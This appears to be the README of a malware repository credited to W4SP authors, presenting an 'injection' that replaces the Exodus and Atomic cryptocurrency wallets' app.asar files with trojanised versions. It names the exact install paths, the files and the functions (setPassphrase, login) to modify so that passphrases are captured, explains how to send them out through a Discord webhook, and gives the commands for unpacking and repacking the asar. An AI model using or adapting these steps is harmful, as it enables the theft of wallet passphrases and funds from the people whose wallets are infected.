# Exodus & Atomic Wallet Injection 🐝
<img src="https://cdn.discordapp.com/attachments/1062042370444636282/1101449782603563079/image.png"></img>
<br>
Exodus Injection by [@xKian](https://github.com/sfx2me) ~ W4SP

<img src="https://cdn.discordapp.com/attachments/1062042370444636282/1101500503323574373/image.png"></img>
<br>
Atomic Injection by [@loTus01](https://github.com/loTus04) ~ W4SP
<br> Ty Paradox for the little tip


## Files
- app.asar
- asar file source code
- JS code injected
- python injector code POC

## Explanation
Exodus and Atomic are nodejs cold wallets, they use a app.asar file to work.<br>
We will replace the wallet app.asar file with our infected one<br>

## Usage
- Host the app.asar file anywhere (like discord)
- In `Wallet Asar Path` you need to put webhook as:<br>
  `Webhook_URL_End:Exodus_Files_Link` -> (1111111111111111/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:https://gofile/exodus.zip)<br>
  Look a the inject.py for more info
- Add the injection.py function to your script or remake it

## Information
Exodus:
- Asar path: `C:\Users\<USER>\AppData\Local\exodus\app-xx.x.xx\resources\app.asar`<br>
- File edited: `src\app\main\index.js`<br>
- Function edited: `setPassphrase(e)`<br>

Atomic:
- Asar path: `C:\Users\<USER>\AppData\Local\Programs\atomic\resources\app.asar`<br>
- File edited: `dist\electron\vendors.c1828ed4edca9a5f556f`<br>
- Function edited: `login()`<br>


## Tutorial (If you want to do your own asar)
- unpack asar file: `$ npx asar extract app.asar asar_src`
- pack asar file: `$ npx asar pack asar_src app.asar`<br>
Find the function where the Passphrase is entered and modify it.
(you dont need any advanced JS knowledge) 
